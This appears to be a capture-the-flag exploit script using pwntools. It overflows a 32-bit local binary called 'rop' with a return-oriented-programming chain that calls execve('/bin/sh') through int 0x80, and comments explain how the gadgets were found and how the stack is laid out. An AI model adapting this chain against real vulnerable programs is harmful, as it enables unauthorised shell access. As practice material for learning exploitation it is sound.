from pwn import *

# Notes
#  * Use ROPGadget
#  * `ROPGadget --binary rop > rop_gadgets`
#  * grep around in `rop_gadgets` for `int 0x80`, `pop e[abcd]x`
#  * `ROPGadget --binary rop --string "/bin/sh"`
#
# Our stack looks like:
#
#    | AAAA    .      |
#    | AAAA    .      |
#    | AAAA    .      |
#    | AAAA (buffer)  |
#    +----------------+
#    | BBBB (old ebp) |
#    +----------------+
#    | ret1 (popexx)  |
#    +----------------+
#    |    0 (edx)     |
#    +----------------+
#    |    0 (ecx)     |
#    +----------------+
#    | /bin/sh (ebx)  |
#    +----------------+
#    | ret2 (popeax)  |
#    +----------------+
#    |  0xb (eax)     |
#    +----------------+
#    |    syscall     |
#    ------------------

syscall = 0x0806d905
popeax  = 0x080b9236
popexx  = 0x0806fd50
binsh   = 0x080bc6a5

ropchain = "A" * 32 + "B" * 4 + p32(popexx) + p32(0) + p32(0) + p32(binsh) + p32(popeax) + p32(0xb) + p32(syscall)

r = process('./rop')
r.send(ropchain)
r.interactive()
